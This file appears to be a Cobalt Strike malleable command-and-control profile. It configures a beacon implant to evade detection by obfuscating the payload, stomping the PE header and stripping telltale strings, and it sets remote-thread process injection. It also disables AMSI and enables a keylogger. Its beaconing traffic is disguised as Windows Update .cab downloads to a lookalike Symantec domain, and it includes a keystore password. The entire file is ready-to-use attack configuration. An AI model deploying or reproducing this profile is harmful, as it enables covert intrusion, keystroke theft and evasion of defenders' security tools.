
set host_stage "false";
set sleeptime "61000";
set jitter    "70";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3943.0 Safari/537.36 Edg/79.0.308.1";

set data_jitter "50";
set smb_frame_header "";
set pipename "srvsvc-1-5-5-03255";
set pipename_stager "srvsvc-1-5-5-01028";

set tcp_frame_header "";
set ssh_banner "Welcome to Ubuntu 19.10.0 LTS (GNU/Linux 4.4.0-19037-aws x86_64)";
set ssh_pipename "srvsvc-1-5-5-0##";

####Manaully add these if your doing C2 over DNS (Future Release)####
##dns-beacon {
#    set dns_idle             "1.2.3.4";
#    set dns_max_txt          "199";
#    set dns_sleep            "1";
#    set dns_ttl              "5";
#    set maxdns               "200";
#    set dns_stager_prepend   "doc-stg-prepend";
#    set dns_stager_subhost   "doc-stg-sh.";

#    set beacon               "doc.bc.";
#    set get_A                "doc.1a.";
#    set get_AAAA             "doc.4a.";
#    set get_TXT              "doc.tx.";
#    set put_metadata         "doc.md.";
#    set put_output           "doc.po.";
#    set ns_response          "zero";

#}



stage {
	set obfuscate "true";
	set stomppe "true";
	set cleanup "true";
	set userwx "false";
	set smartinject "true";
	

	#TCP and SMB beacons will obfuscate themselves while they wait for a new connection.
	#They will also obfuscate themselves while they wait to read information from their parent Beacon.
	set sleep_mask "true";
	

	set checksum       "0";
	set compile_time   "31 Jul 2090 12:56:16";
	set entry_point    "186192";
	set image_size_x86 "1490944";
	set image_size_x64 "1490944";
	set name           "WMNetMgr.DLL";
	set rich_header    "\x35\xe0\x65\x56\x71\x81\x0b\x05\x71\x81\x0b\x05\x71\x81\x0b\x05\x2a\xe9\x08\x04\x72\x81\x0b\x05\x2a\xe9\x0f\x04\x66\x81\x0b\x05\x71\x81\x0a\x05\xf7\x80\x0b\x05\x2a\xe9\x0a\x04\x7c\x81\x0b\x05\x2a\xe9\x0e\x04\x79\x81\x0b\x05\x2a\xe9\x0b\x04\x70\x81\x0b\x05\x2a\xe9\x05\x04\xb9\x81\x0b\x05\x2a\xe9\xf4\x05\x70\x81\x0b\x05\x2a\xe9\x09\x04\x70\x81\x0b\x05\x52\x69\x63\x68\x71\x81\x0b\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
	
	
	
	transform-x86 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";

		}

	transform-x64 {
		prepend "\x90\x90\x90"; # NOP, NOP!
		strrep "ReflectiveLoader" "";
		strrep "This program cannot be run in DOS mode" "";
		strrep "beacon.x64.dll" "";
		strrep "NtQueueApcThread" "";
		strrep "HTTP/1.1 200 OK" "";
		strrep "Stack memory was corrupted" "";
		strrep "beacon.dll" "";
		strrep "ADVAPI32.dll" "";
		strrep "WININET.dll" "";
		strrep "WS2_32.dll" "";
		strrep "DNSAPI.dll" "";
		strrep "Secur32.dll" "";
		strrep "VirtualProtectEx" "";
		strrep "VirtualProtect" "";
		strrep "VirtualAllocEx" "";
		strrep "VirtualAlloc" "";
		strrep "VirtualFree" "";
		strrep "VirtualQuery" "";
		strrep "RtlVirtualUnwind" "";
		strrep "sAlloc" "";
		strrep "FlsFree" "";
		strrep "FlsGetValue" "";
		strrep "FlsSetValue" "";
		strrep "InitializeCriticalSectionEx" "";
		strrep "CreateSemaphoreExW" "";
		strrep "SetThreadStackGuarantee" "";
		strrep "CreateThreadpoolTimer" "";
		strrep "SetThreadpoolTimer" "";
		strrep "WaitForThreadpoolTimerCallbacks" "";
		strrep "CloseThreadpoolTimer" "";
		strrep "CreateThreadpoolWait" "";
		strrep "SetThreadpoolWait" "";
		strrep "CloseThreadpoolWait" "";
		strrep "FlushProcessWriteBuffers" "";
		strrep "FreeLibraryWhenCallbackReturns" "";
		strrep "GetCurrentProcessorNumber" "";
		strrep "GetLogicalProcessorInformation" "";
		strrep "CreateSymbolicLinkW" "";
		strrep "SetDefaultDllDirectories" "";
		strrep "EnumSystemLocalesEx" "";
		strrep "CompareStringEx" "";
		strrep "GetDateFormatEx" "";
		strrep "GetLocaleInfoEx" "";
		strrep "GetTimeFormatEx" "";
		strrep "GetUserDefaultLocaleName" "";
		strrep "IsValidLocaleName" "";
		strrep "LCMapStringEx" "";
		strrep "GetCurrentPackageId" "";
		strrep "UNICODE" "";
		strrep "UTF-8" "";
		strrep "UTF-16LE" "";
		strrep "MessageBoxW" "";
		strrep "GetActiveWindow" "";
		strrep "GetLastActivePopup" "";
		strrep "GetUserObjectInformationW" "";
		strrep "GetProcessWindowStation" "";
		strrep "Sunday" "";
		strrep "Monday" "";
		strrep "Tuesday" "";
		strrep "Wednesday" "";
		strrep "Thursday" "";
		strrep "Friday" "";
		strrep "Saturday" "";
		strrep "January" "";
		strrep "February" "";
		strrep "March" "";
		strrep "April" "";
		strrep "June" "";
		strrep "July" "";
		strrep "August" "";
		strrep "September" "";
		strrep "October" "";
		strrep "November" "";
		strrep "December" "";
		strrep "MM/dd/yy" "";
		strrep "Stack memory around _alloca was corrupted" "";
		strrep "Unknown Runtime Check Error" "";
		strrep "Unknown Filename" "";
		strrep "Unknown Module Name" "";
		strrep "Run-Time Check Failure #%d - %s" "";
		strrep "Stack corrupted near unknown variable" "";
		strrep "Stack pointer corruption" "";
		strrep "Cast to smaller type causing loss of data" "";
		strrep "Stack memory corruption" "";
		strrep "Local variable used before initialization" "";
		strrep "Stack around _alloca corrupted" "";
		strrep "RegOpenKeyExW" "";
		strrep "egQueryValueExW" "";
		strrep "RegCloseKey" "";
		strrep "LibTomMath" "";
		strrep "Wow64DisableWow64FsRedirection" "";
		strrep "Wow64RevertWow64FsRedirection" "";
		strrep "Kerberos" "";
		}
}


process-inject {
    # set remote memory allocation technique
	set allocator "NtMapViewOfSection";

    # shape the content and properties of what we will inject
    set min_alloc "23052";
    set userwx    "false";
    set startrwx "true";

    transform-x86 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    transform-x64 {
        prepend "\x90\x90\x90\x90\x90\x90\x90\x90\x90"; # NOP, NOP!
    }

    # specify how we execute code in the remote process
    execute {
		CreateThread "ntdll.dll!RtlUserThreadStart+0x1337";
        NtQueueApcThread-s;
        SetThreadContext;
        CreateRemoteThread;
		CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";
        RtlCreateUserThread;
	}
}

post-ex {
    # control the temporary process we spawn to
	
	set spawnto_x86 "%windir%\\syswow64\\powercfg.exe";
	set spawnto_x64 "%windir%\\sysnative\\powercfg.exe";

    # change the permissions and content of our post-ex DLLs
    set obfuscate "true";
 
    # pass key function pointers from Beacon to its child jobs
    set smartinject "true";
 
    # disable AMSI in powerpick, execute-assembly, and psinject
    set amsi_disable "true";
	
	# control the method used to log keystrokes 
	set keylogger "SetWindowsHookEx";
}

	
http-config {

	#set "true" if teamserver is behind redirector
	set trust_x_forwarded_for "false";			
}

http-get {
set uri "/c/msdownload/update/others/2021/10/uyKFFNQPDyXvksVPUkuS7G7pK ";



client {

	header "Accept" "*/*";
	header "Host" "numa.symantecupdates.info";
	
	metadata {
		netbios;
		append ".cab";
		uri-append;
	}
}


server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {

		print;
	}
}
}

http-post {
set uri "/c/msdownload/update/others/2021/10/oxKMsZaUYCYN02Isy22 ";


set verb "GET";

client {

	header "Accept" "*/*";


	id {
		prepend "download.windowsupdate.com/c/";
		header "Host";
	}


	output {
		netbios;
		append ".cab";
		uri-append;
	}
}

server {
	header "Content-Type" "application/vnd.ms-cab-compressed";
	header "Server" "Microsoft-IIS/8.5";
	header "MSRegion" "N. America";
	header "Connection" "keep-alive";
	header "X-Powered-By" "ASP.NET";

	output {
		print;
	}
}
}

http-stager {
	server {
		header "Content-Type" "application/vnd.ms-cab-compressed";
	}
}


	
https-certificate {
set keystore "numa.symantecupdates.info.store";
set password "TavorHaEfesInItaly";
}
